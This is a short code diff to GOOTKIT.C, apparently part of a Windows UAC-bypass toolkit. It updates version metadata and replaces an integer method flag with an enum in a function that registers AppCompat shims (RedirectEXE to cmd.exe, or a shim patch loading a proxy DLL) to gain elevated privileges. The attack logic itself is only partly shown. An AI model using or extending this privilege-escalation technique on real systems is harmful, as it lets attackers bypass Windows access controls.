@@ -1,14 +1,14 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2015,
+*  (C) COPYRIGHT AUTHORS, 2014 - 2016,
 *  (C) Original idea (?) mzH,
 *  (C) MS FixIT Shim Patches revealed by Jon Erickson
 **
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     1.90
+*  VERSION:     2.00
 *
-*  DATE:        17 Sept 2015
+*  DATE:        16 Nov 2015
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -444,7 +444,7 @@ BOOL ucmShimPatch(
 *
 */
 BOOL ucmAppcompatElevation(
-	DWORD dwType,
+	UACBYPASSMETHOD Method,
 	CONST PVOID ProxyDll,
 	DWORD ProxyDllSize,
 	LPWSTR lpszPayloadEXE
@@ -472,7 +472,7 @@ BOOL ucmAppcompatElevation(
 		}
 
 		//create and register shim with RedirectEXE, cmd.exe as payload
-		if (dwType == METHOD_REDIRECTEXE) {
+		if (Method == UacMethodRedirectExe) {
 
 			if (lpszPayloadEXE == NULL) {
 				_strcpy_w(szBuffer, L"%systemroot%\\system32\\cmd.exe");
@@ -484,7 +484,7 @@ BOOL ucmAppcompatElevation(
 			return bResult;
 		}  	
 		//create and register shim patch with fubuki as payload
-		if (dwType == METHOD_SHIMPATCH) {
+		if (Method == UacMethodShimPatch) {
 			bResult = ucmShimPatch(ProxyDll, ProxyDllSize);
 		}
 
